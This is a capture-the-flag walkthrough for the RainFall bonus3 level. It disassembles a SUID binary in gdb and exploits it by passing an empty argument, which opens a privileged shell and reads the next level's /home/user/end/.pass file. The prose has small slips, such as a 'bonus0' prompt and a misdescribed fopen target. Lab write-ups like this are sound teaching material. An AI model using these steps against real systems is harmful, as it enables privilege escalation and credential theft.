Login as `bonus3`.
```shell
┌──$ [~/42/2022/rainfall]
└─>  ssh 192.168.0.25 -p 4242 -l bonus3
bonus0@192.168.0.25's password: 71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
  GCC stack protector support:            Enabled
  Strict user copy checks:                Disabled
  Restrict /dev/mem access:               Enabled
  Restrict /dev/kmem access:              Enabled
  grsecurity / PaX: No GRKERNSEC
  Kernel Heap Hardening: No KERNHEAP
 System-wide ASLR (kernel.randomize_va_space): Off (Setting: 0)
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   /home/user/bonus3/bonus3
```
A `SUID` executable is located in the home directory.
```shell
bonus3@RainFall:~$ ls -l
total 8
-rwsr-s---+ 1 end users 5595 Mar  6  2016 bonus3
```
It first open `/home/user/bonus3/bonus3` file in read only mode
```gdb
   [...]
   0x08048502 <+14>:	mov    edx,0x80486f0 // "r"
   0x08048507 <+19>:	mov    eax,0x80486f2 // "/home/user/end/.pass"
   0x0804850c <+24>:	mov    DWORD PTR [esp+0x4],edx
   0x08048510 <+28>:	mov    DWORD PTR [esp],eax
   0x08048513 <+31>:	call   0x8048410 <fopen@plt>
   [...]
```
Then checks if return `fd` is not equals to 0 and that binary was run with one argument. Otherwise it return -1.
```gdb
   0x08048533 <+63>:	cmp    DWORD PTR [esp+0x9c],0x0
   [...]
   0x0804853d <+73>:	cmp    DWORD PTR [ebp+0x8],0x2
```
Once, preliminary checks are passed it calls `fread()` which reads 66 bytes (length of flag) from the stream pointed to by `fd` storing them at the location pointed by `edx`.
```gdb
   [...]
   0x0804854d <+89>:	lea    eax,[esp+0x18]
   0x08048551 <+93>:	mov    edx,DWORD PTR [esp+0x9c]
   0x08048558 <+100>:	mov    DWORD PTR [esp+0xc],edx
   0x0804855c <+104>:	mov    DWORD PTR [esp+0x8],0x42
   0x08048564 <+112>:	mov    DWORD PTR [esp+0x4],0x1
   0x0804856c <+120>:	mov    DWORD PTR [esp],eax
   0x0804856f <+123>:	call   0x80483d0 <fread@plt>
   [...]
```
Then, `av[1]` is compared to stored bytes on `$esp+0x9c` and if two strings are equals a shell is executed.
```gdb
   [...]
   0x080485c7 <+211>:	mov    eax,DWORD PTR [ebp+0xc]
   0x080485ca <+214>:	add    eax,0x4
   0x080485cd <+217>:	mov    eax,DWORD PTR [eax]
   0x080485cf <+219>:	mov    DWORD PTR [esp+0x4],eax
   0x080485d3 <+223>:	lea    eax,[esp+0x18]
   0x080485d7 <+227>:	mov    DWORD PTR [esp],eax
   0x080485da <+230>:	call   0x80483b0 <strcmp@plt>
   [...]
```

Exploit and log on to the next level.
```sh
bonus3@RainFall:~$ ./bonus3 "$(echo -en '\x00')"
$ id
uid=2013(bonus3) gid=2013(bonus3) euid=2014(end) egid=100(users) groups=2014(end),100(users),2013(bonus3)
$ cat /home/user/end/.pass
3321b6f81659f9a71c76616f606e4b50189cecfea611393d5d649f75e157353c
$ su end
Password:
end@RainFall:~$ ls -l
total 4
-rwsr-s---+ 1 end users 26 Sep 23  2015 end
end@RainFall:~$ cat end
Congratulations graduate!
```
